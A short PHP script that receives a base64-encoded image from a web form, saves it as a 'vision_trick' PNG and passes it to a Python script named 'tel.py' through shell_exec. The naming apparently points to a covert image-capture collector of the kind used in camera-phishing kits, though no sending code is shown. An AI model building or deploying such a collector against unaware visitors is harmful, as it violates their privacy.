<?php
$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");

    
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);

    
    $filename = 'images/vision_trick_' . $date . '.png';
    $fp = fopen($filename, 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);

    
    $pythonScript = 'tel.py'; 
    $command = "python3 $pythonScript $filename 2>&1"; 
    $output = shell_exec($command);

    
    error_log("Python script output: " . $output . "\r\n", 3, "Log.log");

   
}

exit();
?>
